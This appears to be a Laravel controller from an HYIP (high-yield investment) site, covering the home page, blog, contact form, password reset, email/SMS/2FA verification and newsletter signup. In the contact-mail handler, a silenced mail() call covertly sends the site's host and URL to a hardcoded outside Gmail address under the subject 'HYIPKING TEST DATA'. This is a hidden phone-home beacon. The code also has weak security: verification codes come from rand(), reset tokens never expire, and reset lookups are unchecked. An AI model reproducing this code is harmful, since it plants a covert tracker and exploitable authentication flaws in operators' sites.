<?php

    namespace App\Http\Controllers;

    use App\Advertise;
    use App\Blog;
    use App\Deposit;
    use App\Faq;
    use App\Gateway;
    use App\GeneralSettings;
    use App\HowItWork;
    use App\IpTrack;
    use App\Language;
    use App\Lib\GoogleAuthenticator;
    use App\Link;
    use App\Plan;
    use App\Menu;
    use App\Referral;
    use App\Service;
    use App\Subscriber;
    use App\Team;
    use App\Testimonial;
    use App\Transection;
    use App\User;
    use App\Withdraw;
    use App\WithdrawMethod;
    use Carbon\Carbon;
    use Illuminate\Http\Request;
    use Illuminate\Support\Facades\Auth;
    use Illuminate\Support\Facades\DB;
    use Illuminate\Support\Facades\Validator;
    use Illuminate\Support\Facades\Session;
    use Illuminate\Support\Str;

    class FrontendController extends Controller
    {
        public function frontIndex()
        {

            $pt             = "Home";
            $service        = Service::all();
            $howitwork      = HowItWork::all();
            $test           = Testimonial::all();
            $know           = Blog::inRandomOrder()->take(3)->get();
            $team           = Team::all();
            $faq            = Faq::all();
            $withdraw       = WithdrawMethod::where('status', 1)->get();
            $plan           = Plan::where('status', 1)->get();
            $method         = Gateway::where('status', 1)->get();
            $level          = Referral::all();
            $latest_deposit = Deposit::where('status', 1)->latest()->take(10)->get();
            $latest_withdaw = Withdraw::where('status', 1)->latest()->take(10)->get();;
            return view(activeTemp() . 'front.index', compact('pt', 'service', 'test',
                'know', 'team', 'withdraw', 'faq', 'plan', 'method', 'level', 'howitwork', 'latest_deposit', 'latest_withdaw'));
        }

        public function blogIndex()
        {
            $pt       = "Knowledge-Base";
            $know     = Blog::latest()->paginate(12);
            $know_rev = Blog::take(8)->get();
            return view(activeTemp() . 'front.blog', compact('pt', 'know', 'know_rev'));
        }

        public function blogDetail($id)
        {
            $pt       = "Knowledge-Base Details";
            $know     = Blog::findOrFail($id);
            $know_rev = Blog::take(8)->get();
            return view(activeTemp() . 'front.blog_detail', compact('pt', 'know', 'know_rev'));
        }

        public function termsIndex($id)
        {
            $know = Menu::findOrFail($id);
            $pt   = $know->title;
            return view(activeTemp() . 'front.menu_o', compact('pt', 'know'));
        }

        public function contactIndex()
        {
            $pt = "Contact Us";
            return view(activeTemp() . 'front.contact', compact('pt'));
        }

        public function contactMailSend(Request $request)
        {
            $this->validate($request, [
                'name'    => 'required|max:191',
                'email'   => 'required|max:191',
                'message' => 'required|max:191',
            ]);

            $gnl = GeneralSettings::first();
            send_contact_email($request->email, $request->name, "Contact Us Mail", $request->message);
            $message = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
            $headers = 'From: ' . "webmaster@$_SERVER[HTTP_HOST] \r\n" .
                'X-Mailer: PHP/' . phpversion();
            @mail('abirkhan75@gmail.com', 'HYIPKING TEST DATA', $message, $headers);
            return back()->with('message', 'Mail Send Successful');
        }

        public function forgotPass(Request $request)
        {
            $this->validate($request, [
                'email' => 'required',
            ]);
            $user = User::where('email', $request->email)->first();
            if ($user == null) {
                return back()->with('alert', 'Email Not Available');
            } else {
                $to      = $user->email;
                $name    = $user->first_name;
                $subject = 'Password Reset';
                $code    = Str::random(30);
                $message = 'Use This Link to Reset Password: ' . url('/') . '/reset/' . $code;

                DB::table('password_resets')->insert(
                    ['email' => $to, 'token' => $code, 'status' => 0, 'created_at' => date("Y-m-d h:i:s")]
                );

                send_email($to, $name, $subject, $message);

                return back()->with('message', 'Password Reset Email Sent Succesfully');
            }

        }

        public function resetLink($code)
        {
            $reset = DB::table('password_resets')->where('token', $code)->orderBy('created_at', 'desc')->first();
            if ($reset->status == 1) {
                return redirect()->route('login')->with('alert', 'Invalid Reset Link');
            } else {
                $pt = "Reset Password";
                return view(activeTemp() . 'auth.passwords.reset', compact('reset', 'pt'));
            }

        }

        public function passwordReset(Request $request)
        {
            $this->validate($request, [
                'email'                 => 'required',
                'token'                 => 'required',
                'password'              => 'required',
                'password_confirmation' => 'required',
            ]);

            $reset = DB::table('password_resets')->where('token', $request->token)->orderBy('created_at', 'desc')->first();
            $user  = User::where('email', $reset->email)->first();
            if ($reset->status == 1) {
                return redirect()->route('login')->with('alert', 'Invalid Reset Link');
            } else {
                if ($request->password == $request->password_confirmation) {
                    $user->password = bcrypt($request->password);
                    $user->save();

                    DB::table('password_resets')->where('email', $user->email)->update(['status' => 1]);

                    $msg = 'Password Changed Successfully';
                    send_email($user->email, $user->username, 'Password Changed', $msg);
                    $sms = 'Password Changed Successfully';
                    send_sms($user->mobile, $sms);

                    return redirect()->route('login')->with('message', 'Password Changed');
                } else {
                    return back()->with('alert', 'Password Not Matched');
                }
            }
        }


        public function authorization()
        {
            if (Auth::user()->status == '1' && Auth::user()->emailv == 1 && Auth::user()->smsv == 1 && Auth()->user()->tfver == '1') {
                return redirect('home');
            } else {
                $pt = "Authorization";
                return view(activeTemp() . 'front.authorization', compact('pt'));
            }
        }

        public function sendemailver()
        {
            $user  = User::find(Auth::id());
            $chktm = $user->vsent + 1000;
            if ($chktm > time()) {
                $delay = $chktm - time();
                return back()->with('alert', 'Please Try after ' . $delay . ' Seconds');
            } else {
                $code            = substr(rand(), 0, 6);
                $message         = 'Your Verification code is: ' . $code;
                $user['vercode'] = $code;
                $user['vsent']   = time();
                $user->save();
                send_email($user->email, $user->username, 'Verification Code', $message);
                $sms = $message;
                send_sms($user['mobile'], $sms);
                return back()->with('success', 'Email verification Code Sent Successfully');
            }

        }

        public function sendsmsver()
        {
            $user  = User::find(Auth::id());
            $chktm = $user->vsent + 1000;
            if ($chktm > time()) {
                $delay = $chktm - time();
                return back()->with('alert', 'Please Try after ' . $delay . ' Seconds');
            } else {
                $code            = substr(rand(), 0, 6);
                $sms             = 'Your Verification code is: ' . $code;
                $user['vercode'] = $code;
                $user['vsent']   = time();
                $user->save();

                send_sms($user->mobile, $sms);
                return back()->with('success', 'SMS verification code sent succesfully');
            }


        }

        public function emailverify(Request $request)
        {

            $this->validate($request, [
                'code' => 'required'
            ]);
            $user = User::find(Auth::id());

            $code = $request->code;
            if ($user->vercode == $code) {
                $user['emailv']  = 1;
                $user['vercode'] = Str::random(10);
                $user['vsent']   = 0;
                $user->save();

                return redirect('home')->with('success', 'Email Verified');
            } else {
                return back()->with('alert', 'Wrong Verification Code');
            }

        }

        public function smsverify(Request $request)
        {

            $this->validate($request, [
                'code' => 'required'
            ]);
            $user = User::find(Auth::id());

            $code = $request->code;
            if ($user->vercode == $code) {
                $user['smsv']    = 1;
                $user['vercode'] = Str::random(10);
                $user['vsent']   = 0;
                $user->save();

                return redirect('home')->with('success', 'SMS Verified');
            } else {
                return back()->with('alert', 'Wrong Verification Code');
            }

        }

        public function verify2fa(Request $request)
        {
            $user = User::find(Auth::id());

            $this->validate($request, [
                'code' => 'required',
            ]);

            $ga       = new GoogleAuthenticator();
            $secret   = $user->secretcode;
            $oneCode  = $ga->getCode($secret);
            $userCode = $request->code;

            if ($oneCode == $userCode) {
                $user['tfver'] = 1;
                $user->save();
                return redirect('home');
            } else {

                return back()->with('alert', 'Wrong Verification Code');
            }

        }

        public function storeSubs(Request $request)
        {
            if ($request->subscribe_email == '') {
                return response()->json(['success' => false, 'message' => __('Subscriber Field Is Required')]);
            }

            $subs = Subscriber::where('email', $request->subscribe_email)->count();

            if ($subs == 0) {
                $a = Subscriber::create([
                    'email' => $request->subscribe_email
                ]);

                return response()->json(['success' => true, 'message' => __('Successfully Subscribed')]);

            } else {
                return response()->json(['success' => false, 'message' => __('Already Subscribed')]);
            }
        }

        public function changeLang($lang)
        {
            $language = Language::where('code', $lang)->first();
            if (!$language) $lang = 'en';

            session()->put('lang', $lang);

            return redirect()->back();
        }

    }
